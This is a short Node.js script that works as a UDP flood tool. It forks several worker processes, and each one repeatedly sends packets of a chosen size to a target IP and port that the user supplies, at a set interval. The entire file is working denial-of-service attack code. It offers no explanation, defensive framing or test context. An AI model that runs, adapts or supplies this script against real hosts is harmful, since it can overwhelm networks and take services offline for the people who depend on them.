const dgram = require('dgram');
const child_process = require('child_process');
const path = require('path');

if (process.argv.length < 7) {
    console.log('node udp.js <target_ip> <target_port> <bytes> <sleep_time> <process_num>');
    process.exit(-1);
}

const target_ip = process.argv[2];
const target_port = parseInt(process.argv[3]);
const bytes = parseInt(process.argv[4]);
const sleep_time = parseInt(process.argv[5]);
const process_num = parseInt(process.argv[6]);
const processes_list = [];

if (!process.argv[7]) {
    for (let i = 0; i < process_num - 1; i++) {
        processes_list.push(child_process.fork(path.join(__dirname, 'udp.js'), [target_ip, target_port, bytes, sleep_time, process_num, 'child']));
    }
    process.on('message', (msg) => {
        if (msg === 'die') {
            process.exit();
        }
    });
}

process.on('SIGINT', () => {
    for (let i in processes_list) {
        processes_list[i].send('die');
    }
    process.exit();
});

const buffer = Buffer.from('A'.repeat(bytes), 'utf-8');

const socket = dgram.createSocket('udp4');

socket.on('close', function () {
    console.log('Socket closed');
    process.exit(-1);
});

socket.on('error', function (error) {
    console.log('Error: ' + error.toString());
    process.exit(-1);
});

function udp() {
    socket.send(buffer, 0, buffer.length, target_port, target_ip, function (error, bytes) {
        if (error) {
            console.log(error.toString());
        } else {
            console.log('Sent ' + bytes + ' bytes to ' + target_ip);
        }
    });
}

setInterval(udp, sleep_time);
